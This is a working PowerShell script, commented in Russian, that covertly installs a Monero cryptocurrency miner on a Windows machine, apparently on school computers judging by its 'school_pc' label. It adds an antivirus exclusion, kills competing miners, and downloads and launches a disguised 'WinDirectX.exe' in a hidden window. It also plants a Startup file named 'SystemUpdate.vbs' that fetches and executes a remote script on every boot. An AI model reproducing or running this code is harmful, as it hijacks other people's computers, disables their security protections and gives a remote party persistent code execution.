$path = "C:\ProgramData\SystemLib"
$wallet = "Ltc1ql404nad6rja6paas9h7dnd2uwmkju3re3s4tuf"
$procName = "WinDirectX"
$exeUrl = "https://github.com/Isfandiyor0112-star/sminers/raw/main/WinDirectX.exe"
$rawScript = "https://raw.githubusercontent.com/Isfandiyor0112-star/sminers/refs/heads/main/win_utility.ps1"

# 1. Полная очистка перед стартом
Stop-Process -Name $procName -Force -ErrorAction SilentlyContinue
Stop-Process -Name "xmrig" -Force -ErrorAction SilentlyContinue

# 2. Настройка питания (режим 24/7)
powercfg /x -standby-timeout-ac 0
powercfg /x -monitor-timeout-ac 5
powercfg /h off

# 3. Создание папки и исключение антивируса
if (!(Test-Path $path)) { New-Item -ItemType Directory -Path $path -Force }
powershell -Command "Add-MpPreference -ExclusionPath '$path'" -ErrorAction SilentlyContinue

# 4. Загрузка файла майнера
try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    Invoke-WebRequest -Uri $exeUrl -OutFile "$path\$procName.exe" -ErrorAction Stop
} catch { exit }

# 5. Создание файлов запуска (Батник)
$cmd = "@echo off`n$path\$procName.exe -o gulf.moneroocean.stream:10128 -u $wallet -p school_pc --cpu-max-threads-hint 50 --no-huge-pages --algo rx/0 --donate-level 1 --priority 4"
$cmd | Out-File -FilePath "$path\run_cache.bat" -Encoding ascii

$vbs = "Set WshShell = CreateObject(`"WScript.Shell`")`nWshShell.Run `"$path\run_cache.bat`", 0, False"
$vbs | Out-File -FilePath "$path\win_start.vbs" -Encoding ascii

# 6. Настройка Автозагрузки ОБНОВЛЕНИЯ (Твоя задумка)
# Этот файл будет при каждом включении качать свежий скрипт с GitHub
$startupVbs = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\SystemUpdate.vbs"
$payload = "CreateObject(""Wscript.Shell"").Run ""powershell -WindowStyle Hidden -Command [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; irm '$rawScript' | iex"", 0, True"
[System.IO.File]::WriteAllText($startupVbs, $payload)

# 7. Команда CHECK
$ProfilePath = $PROFILE
if (!(Test-Path $ProfilePath)) { New-Item -Type File -Path $ProfilePath -Force }
$CheckFunc = @"
function check {
    `$p = Get-Process $procName -ErrorAction SilentlyContinue
    if (`$p) { 
        Write-Host "СТАТУС: РАБОТАЕТ (ID: `$(`$p.Id))" -ForegroundColor Green 
        Write-Host "Память: `$([Math]::Round(`$p.WorkingSet64 / 1MB, 2)) MB" -ForegroundColor White
    }
    else { Write-Host "СТАТУС: ВЫКЛЮЧЕН" -ForegroundColor Red }
}
"@
$CheckFunc | Out-File -FilePath $ProfilePath -Force

# 8. Финальный запуск
Start-Process -FilePath "$path\win_start.vbs"
Write-Host "Установка завершена! ПК будет обновляться через GitHub при каждом включении." -ForegroundColor Magenta
